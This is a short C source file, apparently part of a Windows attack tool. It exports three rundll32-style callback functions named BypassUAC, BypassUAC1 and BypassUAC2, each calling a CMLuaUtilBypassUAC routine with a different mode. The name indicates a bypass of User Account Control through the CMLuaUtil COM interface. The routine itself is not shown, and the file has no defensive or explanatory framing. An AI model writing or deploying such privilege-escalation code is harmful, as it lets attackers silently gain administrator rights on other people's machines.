#include "BypassUAC.h"

void CALLBACK BypassUAC(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	CMLuaUtilBypassUAC(0);
}

void CALLBACK BypassUAC1(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	CMLuaUtilBypassUAC(1);
}

void CALLBACK BypassUAC2(HWND hWnd, HINSTANCE hInstance, LPSTR lpszCmdLine, int iCmdShow)
{
	CMLuaUtilBypassUAC(2);
}